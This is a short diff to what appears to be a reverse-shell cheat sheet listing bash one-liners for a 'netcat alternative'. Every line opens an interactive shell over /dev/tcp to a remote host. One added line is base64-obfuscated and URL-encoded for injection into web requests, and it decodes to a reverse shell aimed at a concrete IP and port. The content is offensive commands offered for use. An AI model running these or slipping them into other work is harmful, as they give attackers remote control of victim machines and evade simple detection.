@@ -9,4 +9,7 @@ Comm | Desc
 #netcatalternative
 `setsid bash -i &>/dev/tcp/IP/PORT 0>&1 &`
 `bash -i &>/dev/tcp/IP/PORT 0>&1' #`
-`echo $(echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' | base64) | base64 -d | bash`
+`echo $(echo 'bash -i &> /dev/tcp/IP/PORT  <&1' | base64) | base64 -d | bash`
+
+
+`echo%20"YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xMjEvNjY2NiA8JjE="%20|%20base64%20-d%20|%20bash`
